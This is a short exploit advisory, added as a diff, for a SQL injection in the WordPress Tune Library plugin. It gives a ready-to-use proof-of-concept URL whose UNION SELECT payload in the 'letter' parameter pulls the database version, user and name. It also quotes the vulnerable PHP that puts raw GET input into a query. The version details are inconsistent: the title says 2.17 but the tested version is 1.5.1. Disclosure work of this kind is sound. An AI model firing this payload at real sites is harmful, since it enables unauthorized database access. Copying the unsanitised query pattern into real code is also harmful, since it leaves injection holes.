@@ -1,0 +1,29 @@
+# Exploit Title: WordPress Tune Library plugin <= 2.17 SQL Injection Vulnerability
+# Date: 2011-09-10
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/tune-library.zip
+# Version: 1.5.1 (tested)
+# Notes: magic_quotes has to be turned off
+#        Plugin setting "Filter artists by letter and show alphabetical navigation" has to be turned on
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/tune-library/tune-library-ajax.php?letter=-1' UNION ALL SELECT CONCAT_WS(CHAR(59),version(),current_user(),database()),2--%20
+
+---------------
+Vulnerable code
+---------------
+$artistletter = $_GET['letter'];
+...
+if ($options['oneletter'] == false || $showallartists == true)
+...
+else
+{
+    if ($artistletter == '#')
+    ...
+    else
+    {
+        $querystr ="SELECT distinct artist, 'artist' as source FROM " . $wpdb->prefix . "tracks where artist != '' and artist like '" .$artistletter . "%' order by artist";
+    }
+}
